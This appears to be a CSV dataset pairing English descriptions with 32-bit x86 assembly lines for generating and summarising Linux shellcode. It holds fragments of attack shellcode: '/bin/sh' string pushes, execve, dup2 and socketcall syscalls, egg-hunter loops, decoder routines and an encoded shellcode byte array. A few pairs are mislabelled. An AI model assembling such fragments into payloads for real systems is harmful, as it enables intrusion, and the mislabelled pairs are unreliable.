input_text,target_text
ShellCodeGen: push the byte +0x1 onto the stack,push byte +0x1
ShellCodeSum: je all,jump to the all label if the operands of the above comparison are equals
ShellCodeSum: cdq,extend the sign bit of the eax register into the edx register
ShellCodeSum: push esp,push esp to the stack
ShellCodeGen: perform a bit-wise inversion of the byte starting at the address in esi,not byte [esi]
ShellCodeGen: make the system call getpgrp,"mov eax, 65"
ShellCodeGen: move msg1 string into eax,"mov eax, msg1"
ShellCodeGen: initialize ecx to zero,"xor ecx, ecx"
ShellCodeGen: place the address of var in eax,"lea eax, [var]"
ShellCodeGen: push the value 0x30 onto the stack,push 0x30
ShellCodeGen: move hellolen into edx,"mov edx, hellolen"
ShellCodeGen: move 0x68732f2f into the dword at address [esp-8],"mov dword [esp-8], 0x68732f2f"
ShellCodeGen: decrement the ecx register and jump to the main_inc label if the contents of the ecx register is not zero else point the ebx register to the stack register,"loop main_inc \n mov ebx, esp"
ShellCodeGen: make sys_exit kernel call,int 80h
ShellCodeGen: left shift the contents of eax 16 bits,"shl eax, 16"
ShellCodeSum: push 0x31373737,push the 0x31373737 onto the stack
"ShellCodeSum: test eax, eax \n jz short loc_402B13",if the contents of the eax register is zero then jump short to the memory location loc_402B13
"ShellCodeSum: add eax, 10",add 10 to eax
ShellCodeGen: move 4 into bl,"mov bl, 4"
ShellCodeGen: put the syscall 17h into the eax register,push byte 17h \n pop eax
ShellCodeGen: push the word bx to the stack,push word bx
ShellCodeGen: put the syscall 0x10 into the eax register,push byte 0x10 \n pop eax
ShellCodeSum: db 0x80,declare a byte and initialize it to 0x80
"ShellCodeSum: push 0x68732f2f \n push 0x6e69622f \n mov edx, esp",move /bin/sh into the edx register
ShellCodeGen: perform a xor operation between ax and 0x539 and save the result in ax,"xor ax, 0x539"
"ShellCodeSum: lea eax,[ebx+0xb]",load the effective address of the operation [ebx+0xb] into the eax register
ShellCodeSum: call main,call the main function
ShellCodeGen: move exit_call into al,"mov al, exit_call"
ShellCodeGen: put the syscall 0x1c into the eax register,push byte 0x1c \n pop eax
"ShellCodeSum: add al, 2",add the value 2 to the contents of the al register
ShellCodeGen: subtract the contents of al register from the contents of bl register and save the result in bl,"sub bl, al"
"ShellCodeSum: push esi \n mov ebx, esp",push the contents of the esi register onto the stack and point ebx to the stack register
"ShellCodeSum: mov ax, bx",move the contents of bx into ax
ShellCodeGen: define fupdisasm label,fupdisasm:
ShellCodeGen: load the effective address [esi+4] into esi,"lea esi, [esi+4]"
ShellCodeSum: pop edx,restore the top of the stack into the edx register
ShellCodeGen: put /bin/sh into ecx,"push 0x68732f2f \n push 0x6e69622f \n mov ecx, esp"
ShellCodeSum: jns duploop,jump to the duploop label if the previous instruction clears the sign flag
ShellCodeGen: move the byte 0bh into al,"mov al, byte 0bh"
"ShellCodeSum: mov bl, 0x7",move 0x7 into bl
"ShellCodeSum: mov al, 2",move 2 into al
"ShellCodeSum: mov ecx, [my_table]",move effective address of my_table in ecx
ShellCodeSum: push 0x203a4457,push the 0x203a4457 onto the stack
ShellCodeGen: execute execve syscall,int 0x80
ShellCodeGen: push double word 0x74652f2f onto the stack and point the esi register to the stack register,"push dword 0x74652f2f \n mov esi, esp"
ShellCodeGen: move 0x2f into the byte in esp,"mov byte [esp], 0x2f"
ShellCodeSum: push ebp,save the old base pointer value
ShellCodeGen: signal,"mov eax, 48"
"ShellCodeSum: mov dword [esp-4], esi",move esi into the doubleword starting at the address esp-4
"ShellCodeSum: mov eax, 65",system call getpgrp
ShellCodeSum: wordvar: resw 1,reserve a word for wordvar
ShellCodeSum: jnz short decode,jump short to the decode label if the zero flag is cleared
ShellCodeSum: decode:,define decode label
"ShellCodeSum: push word 0x662d \n mov ecx, esp",push the word 0x662d onto the stack and point the ecx register to the stack register
ShellCodeGen: move 1666 into bx,"mov bx, 1666"
ShellCodeGen: move the address of the stack pointer into ecx,"mov ecx, esp"
"ShellCodeSum: mov dword [esp-0x10], 0x5f657a69",move the value 0x5f657a69 into the double word starting at the address [esp-0x10]
ShellCodeGen: push the contents of the eax register onto the stack and point ebx to the stack register,"push eax \n mov ebx, esp"
ShellCodeGen: push 0x2e323931 to the stack,push 0x2e323931
"ShellCodeSum: mov eax, 4",make the system call write
ShellCodeSum: push 0xf,push 0xf onto the stack
ShellCodeGen: push 0x6475732f onto the stack,push 0x6475732f
"ShellCodeSum: cmp eax, 0",compare if eax is equal to 0
ShellCodeGen: declare the len label equal to the length of shellcode,len: equ $-shellcode
"ShellCodeSum: cmp eax, ebx \n je 0x47 \n xor ecx, ecx",jump to the memory address 0x47 if the contents of the eax register is equal to the contents of the edi register else zero out the ecx register
ShellCodeGen: push 0xa onto the stack,push 0xa
"ShellCodeSum: mov ebx, [y]",move the contents at memory address y to ebx
ShellCodeGen: jump to download if zero,jz download
ShellCodeGen: if the doubleword starting at the address [eax-8] is not equal to the contents stored at the egg address then jump to the _next label,"cmp dword [eax-8], egg \n jne _next"
"ShellCodeSum: mov [bp+0x31], al",move the contents of the al register at the memory location specified by the operation [bp+0x31]]
ShellCodeGen: push 0x3131313a onto the stack,push 0x3131313a
ShellCodeSum: popad,move doublewords from the stack into the 32 bit registers
ShellCodeGen: move the value 0x656e7265 into the double word starting at the address [esp-0x1c],"mov dword [esp-0x1c], 0x656e7265"
ShellCodeGen: divide eax by ebx,div ebx
"ShellCodeSum: mov edx, environment",move the address of environment variable into edx
ShellCodeSum: jl _while_loop,jump to the _while_loop label if the destination operand is less than the source operand in the above comparison
ShellCodeSum: jne checkint,if the remainder is not equal to zero jump to local label checkint
"ShellCodeSum: test dl, 0x1 \n jnz ready_to_proxy",if the contents of the dl register is not zero then jump to the label ready_to_proxy
"ShellCodeSum: mov al, 0x0a",move 0x0a into al
ShellCodeGen: push the word 0x662d onto the stack and point the eax register to the stack register,"push word 0x662d \n mov eax, esp"
ShellCodeGen: push the dword 0x61722f6c onto the stack,push dword 0x61722f6c
ShellCodeGen: push 0x2e323931 onto the stack,push 0x2e323931
ShellCodeGen: define the all label,all:
ShellCodeSum: push 'sswd',push 'sswd' onto the stack
ShellCodeGen: add ecx to ebx,"add ebx, ecx"
ShellCodeSum: dec ecx \n jns 2f_loop,decrement the contents of the ecx register and jump to the 2f_loop label if the result is not negative
ShellCodeGen: move 128 into cl,"mov cl, 128"
"ShellCodeSum: mov ebp, buff",place address of buffer into ebp
ShellCodeGen: load the effective address of the result of the operation [ebp+20] into the esi register,"lea esi, [ebp+20]"
"ShellCodeSum: cmp dword [var], 10",compare the doubleword stored at memory location var to the integer value 10
ShellCodeGen: define shellcodelen equal to the length of shellcode,shellcodelen equ $-shellcode
"ShellCodeSum: push 0x6873732f \n push 0x6374652f \n mov eax, esp",push the value 0x6873732f and the value 0x6374652f onto the stack and point the eax register to the stack register
ShellCodeGen: jump to next_page if zero,jz next_page
ShellCodeGen: declare the text section,section .text
ShellCodeGen: subtract 0x13 from the al register,"sub al,0x13"
"ShellCodeSum: xor eax, eax",set eax to 0
ShellCodeGen: move the value 0x6d6f646e into the double word starting at the address [esp-0x14],"mov dword [esp-0x14], 0x6d6f646e"
ShellCodeGen: push 0x6168732f onto the stack,push 0x6168732f
"ShellCodeSum: mov eax, [esi-4]",move 4 bytes at memory address esi-4 into eax
ShellCodeSum: push 0x50446862,push 0x50446862 onto the stack
ShellCodeGen: perform a bit-wise inversion of edx,not edx
"ShellCodeSum: cmp DWORD [eax], edx \n jne search_the_egg \n jmp eax",if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the search_the_egg label else jump to the eax register
ShellCodeGen: multiply edx by 4 using left shift,"shl edx, 2"
ShellCodeGen: push the contents of the edx register onto the stack and point ebx to the stack register,"push edx \n mov ebx, esp"
"ShellCodeSum: ror esi, 1",right rotate esi 1 time
ShellCodeGen: if the contents of the eax register is not zero then jump to the label l4 else call the function search,"test eax, eax \n jnz l4 \n call search"
"ShellCodeSum: contents db 'hello world!', 0h",define a string db and initialize to 'hello world!'
ShellCodeGen: jump short to the todo label,jmp short todo
ShellCodeGen: push 0x68736164 to the stack,push 0x68736164
ShellCodeGen: move 10 into esi,"mov esi, 10"
"ShellCodeSum: mov ecx, array",move the first element of array into ecx
ShellCodeGen: compare the value in the eax register to the doubleword addressed by the edi register,scasd
ShellCodeSum: push 0x6f723a30,push 0x6f723a30 onto the stack
"ShellCodeSum: mov edi, esp",move esp into edi
ShellCodeGen: initialize edx with the hexadecimal value 0x0,"xor edx, edx"
ShellCodeGen: negate all the bits of the ax register,not ax
"ShellCodeSum: mov al, 04h",move 04h into al
ShellCodeSum: mul 25,multiply the contents of eax by 25
ShellCodeSum: cdq,extend the sign bit of eax into the edx register
ShellCodeSum: push byte 0x10,push the byte 0x10 onto the stack
ShellCodeGen: define the _exit label,_exit:
ShellCodeGen: push the byte 0xb onto the stack,push byte 0xb
"ShellCodeSum: mov al, a_letter",move data at memory location a_letter into al
"ShellCodeSum: sub ecx, 0x0b454440",subtract 0x0b454440 from the contents in ecx and save the result in ecx
ShellCodeGen: increment ebx,inc ebx
ShellCodeGen: move esp into ebp,"mov ebp, esp"
"ShellCodeSum: mov bx, 20",move the value 20 into bx
ShellCodeGen: load the effective address [ebp+24] into ebx,"lea ebx, [ebp+24]"
ShellCodeGen: move 0x0a into al,"mov al, 0x0a"
ShellCodeGen: move the 4 bytes of data at address esi+4*eax into ecx,"mov ecx, [esi+4*eax]"
ShellCodeSum: push 0x66,push the 0x66 onto the stack
ShellCodeGen: compare the contents at memory location esi and the contents of the edx register,"cmp [esi], edx"
ShellCodeSum: push word 100,push the word 100 onto the stack
ShellCodeGen: push zero_reg onto the stack,push zero_reg
ShellCodeGen: push the byte 0x1 to the stack,push byte 0x1
ShellCodeSum: push byte 0x10 \n pop eax,put the syscall 0x10 into the eax register
ShellCodeGen: perform the xor operation between the value stored at the location ecx and bh,"xor [ecx], bh"
"ShellCodeSum: mov ebx, dword 0x5090508f",move dword 0x5090508f into ebx
ShellCodeGen: decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else point the ecx register to the stack register,"loop l3 \n mov ecx, esp"
ShellCodeSum: push 0x2,push 0x2 to the stack
"ShellCodeSum: mov eax, 27",make the system call alarm
"ShellCodeSum: mov dh, 0xff",move 0xff into dh
ShellCodeGen: move 0bh into bl,"mov bl, 0bh"
"ShellCodeSum: mov ecx, array2",move the first element in array2 into ecx
"ShellCodeSum: sub eax, 0x0efc3532",subtract 0x0efc3532 from the contents in eax and save the result in eax
ShellCodeGen: decrement ebx,dec ebx
ShellCodeGen: multiply eax by 0x10 and stores the result in edx:eax,mul 0x10
ShellCodeGen: declare the end label,end:
ShellCodeSum: 3:,define the numeric label 3
ShellCodeGen: make the system call for write,"mov eax, 4"
ShellCodeSum: push 0x2,push the 0x2 onto the stack
ShellCodeGen: push the word 2 onto the stack,push word 2
ShellCodeGen: if the contents of the al register is equal to the vale 0xaa then jump to the decode_insertion label else perform a logical xor operation between the al register and the bl register and store the result in the al register,"cmp al, 0xaa \n je decode_insertion \n xor al, bl"
ShellCodeGen: ecx point to the top of the stack,"mov ecx, esp"
ShellCodeGen: push the byte 0x04 onto the stack,push byte 0x04
"ShellCodeSum: mov ebx, 3",move decimal number 3 into ebx
ShellCodeSum: decoder:,define decoder label
ShellCodeGen: define set_argv label,set_argv:
ShellCodeGen: subtract 0x3bd04ede from the contents in eax and save the result in eax,"sub eax, 0x3bd04ede"
ShellCodeGen: push 2 onto the stack,push 2
ShellCodeGen: move edx into ecx,"mov ecx, edx"
ShellCodeGen: jump to connect if equal,je connec
"ShellCodeSum: sub al, 0x41",subtract 0x41 from the al register
"ShellCodeSum: mov al, 0x1",move the value 0x1 into the al register
ShellCodeGen: push 0x7369642d to the stack,push 0x7369642d
ShellCodeSum: jmp eax,jump to eax
ShellCodeSum: pop esi,pop the top of the stack into the esi register
"ShellCodeSum: xor edx, edx",clear edx register
ShellCodeGen: add 10 to the variable marks,"add marks, 10"
ShellCodeSum: next_addr:,declare next_addr function
ShellCodeGen: send signal to another process,"mov eax, 37"
ShellCodeSum: push dword 0x6962732f,push the dword 0x6962732f onto the stack
ShellCodeGen: push 0x3170762d to the stack,push 0x3170762d
"ShellCodeSum: mov eax, 1",make the system call exit
ShellCodeGen: swap the values of edx and ebx registers,"xchg edx, ebx"
ShellCodeSum: jmp _start,jump to the _start label
ShellCodeGen: reserve a word for wordvar,wordvar: resw 1
ShellCodeGen: push the word 0x632d onto the stack and point the esi register to the stack register,"push word 0x632d \n mov esi, esp"
"ShellCodeSum: rol byte [esi], 0x2",left rotate the byte in esi 2 times
ShellCodeSum: nop,no operation
ShellCodeSum: call jmp_search,call jmp_search
ShellCodeGen: declare section text,section .text
ShellCodeGen: push the 0x6 value onto the stack,push 0x6
ShellCodeGen: restore the top of the stack into the si register,pop si
"ShellCodeSum: msg db 'i love you!', 0ah",define msg variable and initialize with 'i love you!'
"ShellCodeSum: mov al, 20",move 20 into al
ShellCodeGen: push the byte 8 onto the stack,push byte 8
ShellCodeGen: right shift the contents of dl register by 4 bit positions,"shr dl, 4"
ShellCodeGen: swap the contents of the edi register with the contents of the eax register,"xchg edi, eax"
ShellCodeGen: right shift the contents of the edi register by the contents of the cl register,"shr ax, cl"
ShellCodeGen: compare the value in eax to the doubleword addressed by edi,scasd
ShellCodeSum: writestring:,define writestring function
ShellCodeGen: zero out the eax register and the ecx register,"xor ecx, ecx \n mul ecx"
ShellCodeGen: jump to the memory address 0x8 if the contents of the eax register is not equal to the contents of the eax register,"cmp eax, eax \n jne 0x8"
ShellCodeSum: push 0x7369642d,push 0x7369642d onto the stack
"ShellCodeSum: mov eax, 48",make the system call signal
"ShellCodeSum: push byte 0x11 \n mov ebx, esp",push the byte 0x11 onto the stack and point ebx to the stack register
ShellCodeGen: jump to the l3 label if the contents of the ax register is not equal to the contents of the bx register,"cmp ax, bx \n jne l3"
ShellCodeGen: push the contents of the ecx register onto the stack,push ecx
"ShellCodeSum: add al, 0x25",add 0x25 to the al register
ShellCodeGen: declare the fileaddress label,fileaddress:
"ShellCodeSum: push 0x69622f2f \n mov eax, esp",push the value 0x69622f2f onto the stack and point the eax register to the stack register
ShellCodeSum: not ax,negate all the bits of ax register
"ShellCodeGen: define the array of bytes encodedshellcode and initialize it to 0x4e,0xc1,0x51,0x2f,0x58,0x3c,0xdb,0xac,0xef,0x82,0xef,0x1c,0x2a,0xd9,0xdb,0x90,0xdb,0x6b,0xef,0x61,0x3b,0x1c,0xcb,0x24,0xfb,0xd6,0xc5,0x50,0x23,0xfa,0x58,0x9c,0xc5,0xb1,0x33,0x97,0x28,0x31,0xc5,0xaa,0x43,0xf9,0x56,0xf4,0xad,0xc2,0x02,0x16,0x55,0xe3","encodedshellcode: db 0x4e,0xc1,0x51,0x2f,0x58,0x3c,0xdb,0xac,0xef,0x82,0xef,0x1c,0x2a,0xd9,0xdb,0x90,0xdb,0x6b,0xef,0x61,0x3b,0x1c,0xcb,0x24,0xfb,0xd6,0xc5,0x50,0x23,0xfa,0x58,0x9c,0xc5,0xb1,0x33,0x97,0x28,0x31,0xc5,0xaa,0x43,0xf9,0x56,0xf4,0xad,0xc2,0x02,0x16,0x55,0xe3"
ShellCodeGen: compare the contents of the eax register and the contents of the ebx register,"cmp eax, ebx"
ShellCodeGen: push double word 0x39396e2d onto the stack and point the esi register to the stack register,"push dword 0x39396e2d \n mov esi, esp"
ShellCodeSum: jmp call_egghunter,jump to the call_egghunter label
ShellCodeGen: push 0x636e2f2f onto the stack,push 0x636e2f2f
ShellCodeGen: use stdin,"mov ebx, 0"
ShellCodeGen: put the syscall 0x02 into the eax register,push byte 0x02 \n pop eax
"ShellCodeSum: mov edx, tmp",move the contents of tmp variable into edx
"ShellCodeSum: cmp edx, ebx \n je 0x8 \n mov ebx, edx",jump to the memory address 0x8 if the contents of the edx register is equal to the contents of the ebx register else move the contents of the edx register into the ebx register
"ShellCodeSum: mov eax, 11",make the system call execve
ShellCodeGen: restore the top of the stack into esi register,pop esi
ShellCodeGen: jump to the IncAddr label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register,scasd \n jnz IncAddr \n jmp edi
"ShellCodeSum: cmp eax, eax \n jne 0x8",if the contents of the eax register is not equal to the contents of the eax register then jump to the memory address 0x8
ShellCodeGen: make syscall to terminate the program,int 80h
"ShellCodeSum: mov byte [esi+14], al",move al into the byte at address [esi+14]
"ShellCodeSum: add marks, 10",add 10 to the variable marks
"ShellCodeSum: sub ebx, 2",decrease ebx by 2
"ShellCodeSum: mov ebx, dword 0x50905091",move dword 0x50905091 into ebx
ShellCodeGen: push the value 0x64687373 onto the stack and point the edx register to the stack register,"push 0x64687373 \n mov edx, esp"
"ShellCodeSum: mov eax, 48",signal
ShellCodeSum: push byte +0x10,push the byte +0x10 onto the stack
ShellCodeGen: push the word 0x462d to the stack,push word 0x462d
ShellCodeGen: define the byte value bytes and initialize it to 20,bytes db 20
"ShellCodeSum: mov eax, msg",move the address of msg string into eax
ShellCodeGen: load the effective address of the result of the operation [esi+23] into the ebx register,"lea ebx, [esi+23]"
"ShellCodeSum: mov dword [esp-0x24], 0x732f636f",move the value 0x732f636f into the double word starting at the address [esp-0x24]
ShellCodeGen: jump to the _next label if the doubleword starting at the address [eax-8] is not equal to the contents stored at the egg address,"cmp dword [eax-8], egg \n jne _next"
ShellCodeGen: move the number of bytes of var2 into ecx,"mov ecx, type var2"
ShellCodeSum: not byte [var],negate all bits in the byte at the memory location var
ShellCodeGen: put the syscall 15 into the eax register,push byte 15 \n pop eax
ShellCodeSum: push dword 0x313a303a,push the double word 0x313a303a onto the stack
ShellCodeSum: dup2:,declare the dup2 label
ShellCodeGen: move the contents of the edx register into the ecx register,"mov ecx, edx"
"ShellCodeSum: mov eax, 0x2f766564",move 0x2f766564 into eax
ShellCodeGen: move childmsg into eax,"mov eax, childmsg"
ShellCodeGen: negate edi,neg edi
"ShellCodeSum: sub bl, cl \n jnz l2",subtract the contents of the cl register from the contents of the al register and jump to the l2 label if the result is not zero
ShellCodeGen: swap the values si ebx and bx registers,"xchg si, bx"
ShellCodeGen: jump to the decoded_shellcode label if the result of the logical xor between the ax register and the value 0x539 is zero,"xor ax, 0x539 \n jz decoded_shellcode"
"ShellCodeSum: cmp al, 0xf2 \n je _start",if the contents of the al register is equal to the value 0xf2 then jump to the _start label
"ShellCodeSum: mov ebx, [ebp-4]",move the contents of the address [ebp-4] into the ebx register
ShellCodeGen: pop the top of the stack into the eax register,pop eax
"ShellCodeSum: mov al, 0x42",move 0x42 into al
ShellCodeSum: push 0x7374736f,push the 0x7374736f onto the stack
ShellCodeSum: _while_loop:,define the _while_loop label
ShellCodeGen: negate all the bits of ecx register,not ecx
ShellCodeGen: system call mmap,"mov eax, 90"
"ShellCodeSum: mov dword [esp-0x1c], 0x656e7265",move the value 0x656e7265 into the double word starting at the address [esp-0x1c]
ShellCodeGen: divide ebx by 2 using right shift,"shr ebx, 1"
ShellCodeSum: push 20,push the 20 onto the stack
"ShellCodeSum: cmp [ebp+arg_0], 1",compare the contents stored at ebp+arg_0 with 1
ShellCodeSum: push dword [ebp+16],push the dword [ebp+16] onto the stack
"ShellCodeSum: cmp BYTE [esi], 0x7 \n jl lowbound \n sub BYTE [esi], 0x7",if the byte starting at the address contained in the esi register is lower than the byte value 0x7 then jump to the lowbound label else subtract the byte value 0x7 from byte starting at the address contained in the esi register
ShellCodeGen: push the value 0x68732f2f onto the stack,push 0x68732f2f
"ShellCodeSum: mov eax, edi",move edi into eax
ShellCodeGen: if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label,"cmp eax, ebx \n je exit"
ShellCodeGen: push the byte 0x3 onto the stack,push byte 0x3
ShellCodeGen: move 0xb5 into al,"mov al, 0xb5"
ShellCodeSum: pop eax,remove last character from the stack into edx
ShellCodeGen: increment eax,inc eax
ShellCodeSum: shift_decode:,define shift_decode label
"ShellCodeSum: test cl, cl",test the value of cl
ShellCodeSum: push 0x706d742f,push 0x706d742f onto the stack
"ShellCodeSum: mov ecx, 0777",move permissions to read write and execute into ecx
ShellCodeGen: multiply the contents of eax by ebx,mul ebx
"ShellCodeSum: mov bx, 1666",move 1666 into bx
"ShellCodeSum: mov cl, 0x2",move the value 0x2 into the cl register
ShellCodeGen: move the contents at memory address temp2 to ebx,"mov ebx, [temp2]"
ShellCodeGen: jump short to the label l1 if the contents of the ebx register is negative,"test ebx, ebx \n js short l1"
ShellCodeSum: dec eax,decrement eax
ShellCodeGen: allocate memory for local variables,"sub esp, 4"
ShellCodeGen: push the word 0x7773 to the stack,push word 0x7773
"ShellCodeSum: test ebx, ebx",test the contents of the ebx register
"ShellCodeSum: mov al, 0x04",move 0x04 into al
ShellCodeGen: push the byte +0x2 onto the stack,push byte +0x2
"ShellCodeSum: cmp dl, 1 \n je exit \n jmp reading",jump to the exit label if the contents of the dl register is equal to the vale 1 else jump to the reading label
ShellCodeGen: move 132 into dx,"mov dx, 132"
ShellCodeSum: jz _start,jump to the _start label if the zero flag is set
ShellCodeGen: decrement ecx and jumps to the decode label unless decrementing ecx caused its value to become zero,loop decode
ShellCodeGen: move 0x16a into ax,"mov ax, 0x16a"
ShellCodeSum: push word 0x632d,push the word 0x632d to the stack
ShellCodeSum: call execute,call the execute function
ShellCodeGen: move 0x401 into cx,"mov cx, 0x401"
ShellCodeSum: dec edx,decrement the edx register by one
"ShellCodeSum: xor eax, eax",perform xor operation between eax and eax
"ShellCodeSum: push 0x68732f2f \n push 0x6e69622f \n mov eax, esp",push /bin/sh onto the stack and point the eax register to the stack register
"ShellCodeSum: sub dx, bx",subtract the contents of bx from the contents of dx
ShellCodeSum: me:,define me label
"ShellCodeSum: mov dword [esi + 8], ebx",move ebx into the dword at address [esi + 8]
ShellCodeSum: push 0x74652f2f,push 0x74652f2f onto the stack
ShellCodeGen: jump to the aslr_file label,jmp aslr_file
ShellCodeGen: divide edx by 4 using right shift,"shr edx, 2"
ShellCodeGen: move esi into edi,"mov edi, esi"
ShellCodeGen: if the byte starting at the address contained in the esi register is lower than the byte value 0x7 then jump to the lowbound label,"cmp BYTE [esi], 0x7 \n jl lowbound"
"ShellCodeSum: push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp",move /bin/sh into the ebx register
ShellCodeSum: jz next_cycle,if zero jump to the next_cycle label
ShellCodeGen: move 10 into bl,"mov bl, 10"
ShellCodeGen: push the word 0x632d onto the stack and point the ecx register to the stack register,"push word 0x632d \n mov ecx, esp"
ShellCodeGen: define string as the byte string 'prova.txt',string: db 'prova.txt'
ShellCodeSum: _next:,define the _next label
ShellCodeGen: declare the fill label,fill:
ShellCodeGen: move the byte at the memory location specified by the operation [esi+1+ebp] into al,"mov al, byte [esi+1+ebp]"
ShellCodeGen: move 110 into the effective address saved in ebx,"mov [ebx], 110"
ShellCodeGen: move the contents of memory address esi+ecx into bl,"mov bl, [esi+ecx]"
"ShellCodeSum: add esi, 0x3f3f3f3f",add 0x3f3f3f3f to the contents in esi and save the result in esi
ShellCodeGen: push 16 onto the stack,push 16
"ShellCodeSum: mov ax, 45h",transfer the immediate constant 45h to ax
ShellCodeGen: push the word 0x0a onto the stack,push word 0x0a
ShellCodeGen: load the effective address of the operation [bp+0x08] into the bx register,"lea bx, [bp+0x08]"
ShellCodeGen: left rotate the byte in esi 2 times,"rol byte [esi], 0x2"
"ShellCodeSum: mov al, byte [esi+1+ebp]",move the byte at the memory location specified by the operation [esi+1+ebp] into al
ShellCodeSum: loop ROT_decode \n jmp short Shellcode,decrement the ecx register and jump to the ROT_decode label if the contents of the ecx register is not zero else jump short to the Shellcode label
ShellCodeGen: load the effective address of the result of the operation [esi+47] into the edx register,"lea edx, [esi+47]"
"ShellCodeSum: rol byte [esi], 0x2",left rotate the byte at the address esi by 0x2 bits
ShellCodeSum: push byte 0x17,push the byte 0x17 onto the stack
"ShellCodeSum: mov dx, 0xb01",move 0xb01 into dx
"ShellCodeSum: cmp DWORD [eax], edx \n jne loop \n jmp eax",if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the loop label else jump to the eax register
"ShellCodeSum: sub byte [ebp+ecx],20h",subtract 20h from the 8-bit at memory location ebp+ecx
"ShellCodeSum: mov al, 0x66",make the systemcall socketcall
ShellCodeSum: pushw 0x697a,push the 0x697a onto the stack
ShellCodeGen: push the value 0x6475732f and the value 0x6374652f onto the stack and point the ebx register to the stack register,"push 0x6475732f \n push 0x6374652f \n mov ebx, esp"
ShellCodeGen: invoke sys_unlink,"mov eax, 10"
ShellCodeGen: move dl into the address [ebx+0xe],"mov [ebx+0xe], dl"
ShellCodeSum: push byte 0x64,push the byte 0x64 to the stack
ShellCodeSum: push byte 2 \n pop eax,put the syscall 2 into the eax register
ShellCodeSum: string: db 'prova.txt',define string as the byte string 'prova.txt'
ShellCodeSum: int 0x80,system call interrupt 0x80
"ShellCodeSum: loop l4 \n mov edx, esp",decrement the ecx register and jump to the l4 label if the contents of the ecx register is not zero else point the edx register to the stack register
ShellCodeGen: move 0x42 into al,"mov al, 0x42"
ShellCodeGen: push esp to the stack,push esp
ShellCodeSum: push 0x69622f2f,push 0x69622f2f to the stack
ShellCodeGen: jump to the exit label if the contents of the dl register is equal to the vale 1 else jump to the reading label,"cmp dl, 1 \n je exit \n jmp reading"
ShellCodeSum: int 80h,call sys_read to fill the buffer
ShellCodeSum: jmp_search:,define the jmp_search label
ShellCodeSum: push byte 10 \n pop eax,put the syscall 10 into the eax register
ShellCodeSum: dec eax,decrement the eax register by one
ShellCodeGen: call the decoder function,call decoder
ShellCodeGen: move dl into the byte in esi,"mov byte [esi], dl"
ShellCodeGen: move the memory address of buffer variable into eax,"mov eax, buffer"
ShellCodeGen: subtract the contents of the cl register from the contents of the al register and jump to the l2 label if the result is not zero,"sub bl, cl \n jnz l2"
ShellCodeSum: push byte 0x02,push the byte 0x02 onto the stack
"ShellCodeSum: mov [ebp-4], edi",move edi into the local memory address ebp-4
ShellCodeGen: initialize edi with 0,"xor edi, edi"
ShellCodeGen: declare the decode label,decode:
ShellCodeGen: push the value 0x2f2f2f2f onto the stack and point eax to the stack register,"push 0x2f2f2f2f \n mov eax, esp"
ShellCodeGen: if the unsigned contents of the ecx register is greater than the unsigned contents of the edx register then jump to the l1 label else,"cmp ecx, edx \n ja l1"
ShellCodeGen: jump to the label loop_1 if the first byte of the esi register is not equal to the contents of the bl register,"cmp BYTE bl, [esi] \n jne loop_1"
"ShellCodeSum: sub eax, 8",subtract 8 from the contents of the eax register
"ShellCodeSum: mov cl, 30",move 30 into cl
ShellCodeSum: dec ebx,decrement ebx
ShellCodeGen: move 0x1 into cl,"mov cl, 0x1"
ShellCodeSum: jne 804809a,jump to 804809a if not equal
ShellCodeSum: key equ 0xdeadbeef,define key constant equal to 0xdeadbeef
ShellCodeSum: variablename2: resw 1,reserve 1 word for variableName2
ShellCodeGen: call the cont function,call cont
"ShellCodeSum: cmp al, 9 \n jge l1",jump to the label l1 if the contents of the al register is greater than or equal to the decimal value 9
ShellCodeGen: declare the path label,path:
ShellCodeGen: if the contents of the al register is equal to the value 0xf2 then jump to the _start label,"cmp al, 0xf2 \n je _start"
ShellCodeGen: load the effective address [zero_reg+117] into ecx,"lea ecx, [zero_reg+117]"
"ShellCodeSum: mov ebx, eax",move eax into ebx
ShellCodeGen: push 0x61702f2f onto the stack,push 0x61702f2f
"ShellCodeSum: mov a_letter, al",move al into memory address a_letter
ShellCodeGen: if not equal jump short to the _while_loop,jne short _while_loop
"ShellCodeSum: cmp dword [eax-8], egg \n jne _next",if the doubleword starting at the address [eax-8] is not equal to the contents stored at the egg address then jump to the _next label
"ShellCodeSum: mov byte [eax], dl",move dl into the byte at address [eax]
ShellCodeGen: compare the contents of the ecx register with the contents of the ebp register,"cmp ecx, ebp"
